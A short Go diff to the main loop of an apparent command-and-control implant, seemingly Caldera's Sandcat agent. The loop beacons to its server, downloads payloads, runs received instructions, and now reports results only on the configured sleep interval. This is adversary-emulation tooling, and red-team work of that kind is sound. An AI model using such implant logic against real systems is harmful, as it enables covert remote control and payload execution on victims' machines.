@@ -41,6 +41,7 @@ func runAgent (sandcatAgent *agent.Agent, c2Config map[string]string) {
 	watchdog := 0
 	checkin := time.Now()
 	lastDiscovery := time.Now()
+	var sleepDuration float64
 	for (evaluateWatchdog(checkin, watchdog)) {
 		// Send beacon and get response.
 		beacon := sandcatAgent.Beacon()
@@ -66,13 +67,15 @@ func runAgent (sandcatAgent *agent.Agent, c2Config map[string]string) {
 					} else {
 						output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", instruction["id"]))
 						droppedPayloads := sandcatAgent.DownloadPayloads(instruction["payloads"].([]interface{}))
-						go sandcatAgent.RunInstruction(instruction, droppedPayloads, true)
-						sandcatAgent.Sleep(instruction["sleep"].(float64))
+						result := sandcatAgent.RunInstruction(instruction, droppedPayloads, false)
+						// Only call home on specified sleep interval
+						sandcatAgent.Sleep(sleepDuration)
+						sandcatAgent.GetBeaconContact().SendExecutionResults(sandcatAgent.GetTrimmedProfile(), result)
+						sandcatAgent.Sleep(sleepDuration) // Sleep again before beaconing home
 					}
 				}
 			}
 		} else {
-			var sleepDuration float64
 			if len(beacon) > 0 {
 				sleepDuration = float64(beacon["sleep"].(int))
 				watchdog = beacon["watchdog"].(int)
